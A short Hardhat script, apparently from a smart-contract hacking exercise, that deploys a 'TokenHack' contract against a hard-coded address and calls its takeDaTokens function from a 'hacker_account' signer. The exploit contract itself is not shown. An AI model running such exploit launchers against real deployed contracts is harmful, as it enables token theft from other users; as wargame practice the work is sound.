
const { ethers } = require("hardhat");

async function main() {

    let deployer, hacker_account
    // step one step contract to deploy
    const account = await ethers.getSigners()
  
    hacker_account = account[0]

    const tokenH_contract = await ethers.getContractFactory("TokenHack", hacker_account);

    console.log("Step 1")
    const tokenH_deploy = await tokenH_contract.deploy('0xF3709E4208845cc3120a627007781306522C008e')
    console.log("Step 2")

    tokenH_trans = await tokenH_deploy.connect(hacker_account).takeDaTokens({gasLimit: 3000000});
    
}

main()
.then(() => process.exit(0))
.catch((error)=> {
  console.error(error);
  process.exit(1);
});